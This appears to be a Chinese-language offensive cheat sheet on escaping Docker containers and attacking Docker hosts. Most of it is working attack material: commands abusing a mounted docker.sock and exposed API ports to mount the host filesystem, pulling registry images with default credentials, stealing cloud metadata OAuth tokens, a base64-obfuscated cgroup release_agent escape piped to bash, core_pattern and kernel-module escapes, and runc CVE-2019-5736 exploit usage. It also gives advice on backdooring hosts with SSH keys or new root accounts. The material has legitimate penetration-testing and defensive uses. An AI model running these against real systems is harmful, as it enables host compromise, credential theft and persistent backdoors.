# 容器 - Docker

> Docker 是一组基于操作系统级虚拟化将软件打包成容器形式交付的平台即服务（PaaS）产品。

## 摘要

- [工具](#工具)
- [挂载的Docker套接字](#挂载的Docker套接字)
- [开放的Docker API端口](#开放的Docker-API端口)
- [不安全的Docker注册表](#不安全的Docker注册表)
- [利用特权容器滥用Linux cgroup v1](#利用特权容器滥用Linux-cgroup-v1)
  - [滥用CAP_SYS_ADMIN功能](#滥用capsysadmin功能)
  - [滥用coredumps和core_pattern](#滥用coredumps和corepattern)
- [通过runc跳出Docker](#通过runc跳出Docker)
- [使用设备文件跳出容器](#使用设备文件跳出容器)
- [参考资料](#参考资料)

## 工具

* [Dockscan](https://github.com/kost/dockscan) : Dockscan 是一个针对Docker安装的安全漏洞和审计扫描器

  ```powershell
  dockscan unix:///var/run/docker.sock
  dockscan -r html -o myreport -v tcp://example.com:5422
  ```

* [DeepCe](https://github.com/stealthcopter/deepce) : Docker枚举、权限提升和容器逃逸（DEEPCE）

  ```powershell
  ./deepce.sh 
  ./deepce.sh --no-enumeration --exploit PRIVILEGED --username deepce --password deepce
  ./deepce.sh --no-enumeration --exploit SOCK --shadow
  ./deepce.sh --no-enumeration --exploit DOCKER --command "whoami>/tmp/hacked"
  ```

## 挂载的Docker套接字

前提条件：

* 套接字作为卷挂载：`- "/var/run/docker.sock:/var/run/docker.sock"`

通常在 `/var/run/docker.sock` 中找到，例如对于Portainer。

```powershell
curl --unix-socket /var/run/docker.sock http://127.0.0.1/containers/json
curl -XPOST –unix-socket /var/run/docker.sock -d '{"Image":"nginx"}' -H 'Content-Type: application/json' http://localhost/containers/create
curl -XPOST –unix-socket /var/run/docker.sock http://localhost/containers/ID_FROM_PREVIOUS_COMMAND/start
```

使用 [brompwnie/ed](https://github.com/brompwnie/ed) 利用

```powershell
root@37bb034797d1:/tmp# ./ed_linux_amd64 -path=/var/run/ -autopwn=true        
[+] Hunt dem Socks
[+] Hunting Down UNIX Domain Sockets from: /var/run/
[*] Valid Socket: /var/run/docker.sock
[+] Attempting to autopwn
[+] Hunting Docker Socks
[+] Attempting to Autopwn:  /var/run/docker.sock
[*] Getting Docker client...
[*] Successfully got Docker client...
[+] Attempting to escape to host...
[+] Attempting in TTY Mode
chroot /host && clear
echo 'You are now on the underlying host'
chroot /host && clear
echo 'You are now on the underlying host'
/ # chroot /host && clear
/ # echo 'You are now on the underlying host'
You are now on the underlying host
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

## 开放的Docker API端口

前提条件：

* Docker 以 `-H tcp://0.0.0.0:XXXX` 运行

```powershell
$ nmap -sCV 10.10.10.10 -p 2376
2376/tcp open  docker  Docker 19.03.5
| docker-version:
|   Version: 19.03.5
|   MinAPIVersion: 1.12
```

挂载当前系统到一个新的“临时”Ubuntu容器中，你将在 `/mnt` 中获得对文件系统的root访问权限。

```powershell
$ export DOCKER_HOST=tcp://10.10.10.10:2376
$ docker run --name ubuntu_bash --rm -i -v /:/mnt -u 0  -t ubuntu bash
或
$ docker -H  open.docker.socket:2375 ps
$ docker -H  open.docker.socket:2375 exec -it mysql /bin/bash
或 
$ curl -s –insecure https://tls-opendocker.socket:2376/secrets | jq
$ curl –insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'
```

从那里你可以通过在 `/root/.ssh` 中添加ssh密钥或在 `/etc/passwd` 中添加新的root用户来后门文件系统。

## 不安全的Docker注册表

Docker注册表的指纹是`Docker-Distribution-Api-Version`头。然后连接到注册表API端点：`/v2/_catalog`。

```powershell
curl https://registry.example.com/v2/<image_name>/tags/list
docker pull https://registry.example.com:443/<image_name>:<tag>

# 连接到端点并列出镜像blobs
curl -s -k --user "admin:admin" https://docker.registry.local/v2/_catalog
curl -s -k --user "admin:admin" https://docker.registry.local/v2/wordpress-image/tags/list
curl -s -k --user "admin:admin" https://docker.registry.local/v2/wordpress-image/manifests/latest
# 下载blobs
curl -s -k --user 'admin:admin' 'http://docker.registry.local/v2/wordpress-image/blobs/sha256:c314c5effb61c9e9c534c81a6970590ef4697b8439ec6bb4ab277833f7315058' > out.tar.gz
# 自动下载
https://github.com/NotSoSecure/docker_fetch/
python /opt/docker_fetch/docker_image_fetch.py -u http://admin:admin@docker.registry.local
```

访问私有注册表并使用其镜像启动容器

```powershell
docker login -u admin -p admin docker.registry.local
docker pull docker.registry.local/wordpress-image
docker run -it docker.registry.local/wordpress-image /bin/bash
```

使用来自Google的OAuth Token访问私有注册表

```powershell
curl http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/email
curl -s http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token 
docker login -e <email> -u oauth2accesstoken -p "<access token>" https://gcr.io
```

## 利用特权容器滥用Linux cgroup v1

前提条件（至少一个）：

 * `--privileged`
 * `--security-opt apparmor=unconfined --cap-add=SYS_ADMIN` 标志。

### 滥用CAP_SYS_ADMIN能力

```powershell
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash -c 'echo "cm5kX2Rpcj0kKGRhdGUgKyVzIHwgbWQ1c3VtIHwgaGVhZCAtYyAxMCkKbWtkaXIgL3RtcC9jZ3JwICYmIG1vdW50IC10IGNncm91cCAtbyByZG1hIGNncm91cCAvdG1wL2NncnAgJiYgbWtkaXIgL3RtcC9jZ3JwLyR7cm5kX2Rpcn0KZWNobyAxID4gL3RtcC9jZ3JwLyR7cm5kX2Rpcn0vbm90aWZ5X29uX3JlbGVhc2UKaG9zdF9wYXRoPWBzZWQgLW4gJ3MvLipccGVyZGlyPVwoW14sXSpcKS4qL1wxL3AnIC9ldGMvbXRhYmAKZWNobyAiJGhvc3RfcGF0aC9jbWQiID4gL3RtcC9jZ3JwL3JlbGVhc2VfYWdlbnQKY2F0ID4gL2NtZCA8PCBfRU5ECiMhL2Jpbi9zaApjYXQgPiAvcnVubWUuc2ggPDwgRU9GCnNsZWVwIDMwIApFT0YKc2ggL3J1bm1lLnNoICYKc2xlZXAgNQppZmNvbmZpZyBldGgwID4gIiR7aG9zdF9wYXRofS9vdXRwdXQiCmhvc3RuYW1lID4+ICIke2hvc3RfcGF0aH0vb3V0cHV0IgppZCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKcHMgYXh1IHwgZ3JlcCBydW5tZS5zaCA+PiAiJHtob3N0X3BhdGh9L291dHB1dCIKX0VORAoKIyMgTm93IHdlIHRyaWNrIHRoZSBkb2NrZXIgZGFlbW9uIHRvIGV4ZWN1dGUgdGhlIHNjcmlwdC4KY2htb2QgYSt4IC9jbWQKc2ggLWMgImVjaG8gXCRcJCA+IC90bXAvY2dycC8ke3JuZF9kaXJ9L2Nncm91cC5wcm9jcyIKIyMgV2FpaWlpaXQgZm9yIGl0Li4uCnNsZWVwIDYKY2F0IC9vdXRwdXQKZWNobyAi4oCiPygowq/CsMK3Ll8u4oCiIHByb2ZpdCEg4oCiLl8uwrfCsMKvKSnYn+KAoiIK" | base64 -d | bash -'
```

漏洞利用分解：

```powershell
# 在主机上
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
 
# 在容器内
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

### 滥用coredumps和core_pattern

1. 使用`mount`找到挂载点

   ```ps1
   $ mount | head -n 1
   overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/YLH6C6EQMMG7DA2AL5DUANDHYJ:/var/lib/docker/overlay2/l/HP7XLDFT4ERSCYVHJ2WMZBG2YT,upperdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff,workdir=/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/work)
   ```

2. 在文件系统的根目录创建一个恶意二进制文件：`cp /tmp/poc /poc`

3. 设置在coredumps上执行的程序

   ```ps1
   echo "|/var/lib/docker/overlay2/c51a87501842b287018d22e9d09d7d8dc4ede83a867f36ca199434d5ea5ac8f5/diff/poc" > /proc/sys/kernel/core_pattern
   ```

4. 使用有问题的程序生成coredump：`gcc -o crash crash.c && ./crash`

   ```cpp
   int main(void) {
       char buf[1];
       for (int i = 0; i < 100; i++) {
           buf[i] = 1;
       }
       return 0;
   }
   ```

5. 你的有效载荷应该已经在主机上执行了

# Docker容器逃逸漏洞分析

## 通过runC突破Docker

> 该漏洞允许恶意容器（只需最少的用户交互）覆盖宿主机的runc二进制文件，从而在宿主机上获得root级别的代码执行权限。用户交互的程度是能够在以下任一上下文中以root身份运行任何命令：使用攻击者控制的镜像创建新容器。附加（docker exec）到攻击者之前有写入权限的现有容器中。 - runC团队对漏洞的概述

CVE-2019-5736漏洞利用：https://github.com/twistlock/RunC-CVE-2019-5736

```powershell
$ docker build -t cve-2019-5736:malicious_image_POC ./RunC-CVE-2019-5736/malicious_image_POC
$ docker run --rm cve-2019-5736:malicious_image_POC
```

## 使用设备文件突破容器

```powershell
https://github.com/FSecureLABS/fdpasser
在容器内，以root身份：./fdpasser recv /moo /etc/shadow
在容器外，以UID 1000身份：./fdpasser send /proc/$(pgrep -f "sleep 1337")/root/moo
在容器外：ls -la /etc/shadow
输出：-rwsrwsrwx 1 root shadow 1209 Oct 10  2019 /etc/shadow
```

## 通过内核模块加载突破Docker

> 当特权Linux容器尝试加载内核模块时，这些模块会被加载到宿主机的内核中（因为只有一个内核，不像虚拟机那样）。这提供了一种简单的容器逃逸途径。

利用方法：

* 克隆仓库：`git clone https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping`
* 使用`make`编译
* 以特权模式启动docker容器：`docker run -it --privileged --hostname docker --mount "type=bind,src=$PWD,dst=/root" ubuntu`
* 在新容器内执行`cd /root`
* 使用`./escape`插入内核模块
* 运行`./execute`！

与其他技术不同，这个模块不包含任何系统调用挂钩，而只是创建了两个新的proc文件；`/proc/escape`和`/proc/output`。

* `/proc/escape`只响应写请求，简单地执行通过[`call_usermodehelper()`](https://www.kernel.org/doc/htmldocs/kernel-api/API-call-usermodehelper.html)传递的任何内容。
* `/proc/output`仅在写入时接收输入并将其存储在缓冲区中，然后在从中读取时返回该缓冲区 - 本质上充当一个容器和宿主机都可以读写的文件。

巧妙之处在于，我们写入`/proc/escape`的任何内容都会被夹入`/bin/sh -c <INPUT> > /proc/output`。这意味着命令在`/bin/sh`下运行，输出被重定向到`/proc/output`，然后我们可以从容器内部读取。

一旦加载了模块，你可以简单地`echo "cat /etc/passwd" > /proc/escape`，然后通过`cat /proc/output`获取结果。或者，你可以使用`execute`程序给自己一个临时的shell（尽管是一个非常基本的shell）。

唯一的注意点是，我们不能确定容器是否安装了`kmod`（提供`insmod`和`rmmod`）。为了克服这一点，在构建内核模块之后，我们将它的字节数组加载到一个C程序中，该程序随后使用`init_module()`系统调用来将模块加载到内核中，无需`insmod`。如果你感兴趣，可以查看Makefile。

## 参考资料

- [远程黑客攻击Docker - 2020年3月17日 - ch0ks](https://hackarandas.com/blog/2020/03/17/hacking-docker-remotely/)
- [理解Docker容器逃逸 - 2019年7月19日 - Trail of Bits](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [在BSidesSF CTF中捕获所有旗帜，通过攻破我们的基础设施 - Hackernoon](https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)
- [通过runc突破Docker - 解释CVE-2019-5736 - Yuval Avrahami - 2019年2月21日](https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/)
- [CVE-2019-5736：从Docker和Kubernetes容器逃逸到宿主机上的root - dragonsector.pl](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
- [OWASP - Docker安全备忘单](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Docker_Security_Cheat_Sheet.md)
- [黑客解剖学：Docker注册表 - NotSoSecure - 2017年4月6日](https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/)
- [Linux内核黑客技术3.8：特权容器逃逸 - Harvey Phillips @xcellerator](https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.8_privileged_container_escaping)

* [为了乐趣逃离特权容器 - 2022年3月6日 :: Jordy Zomer](https://pwning.systems/posts/escaping-containers-for-fun/)